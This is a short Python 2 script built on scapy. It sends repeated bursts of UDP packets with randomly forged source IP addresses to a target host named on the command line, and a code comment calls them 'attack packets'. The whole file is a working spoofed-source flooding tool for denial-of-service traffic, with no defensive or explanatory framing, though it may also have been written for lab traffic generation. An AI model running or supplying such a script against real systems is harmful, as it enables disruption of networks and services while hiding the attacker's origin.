import sys, signal
import time
from os import popen
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import sendp, IP, UDP, Ether, TCP
from random import randrange
import time
import signal, os

def sourceIPgen():
      
  not_valid = [10,127,254,255,1,2,169,172,192]

  first = randrange(1,256)


  while first in not_valid:
    first = randrange(1,256)
    print first
  ip = ".".join([str(first),str(randrange(1,256)), str(randrange(1,256)),str(randrange(1,256))])
  print ip
  return ip


def main():
  for i in range (1,5):
    traffic()
    time.sleep (10)

def handler(signum, frame):
    print 'Crtl+C', signum

def traffic():

# getting the ip address to send attack packets 
  dstIP = sys.argv[1:]
  print dstIP
  src_port = 80
  dst_port = 1

# open interface eth0 to send packets
  interface = popen('ifconfig | awk \'/eth0/ {print $1}\'').read()

  for i in xrange(0,500):
    packets = Ether()/IP(dst=dstIP,src=sourceIPgen(),ttl=18)/UDP(dport=dst_port,sport=src_port)
    print(repr(packets))

# send packet with the defined interval (seconds) 
    sendp( packets,iface=interface.rstrip(),inter=0.01)

if __name__=="__main__":
    main()
    signal.signal(signal.SIGINT, handler)
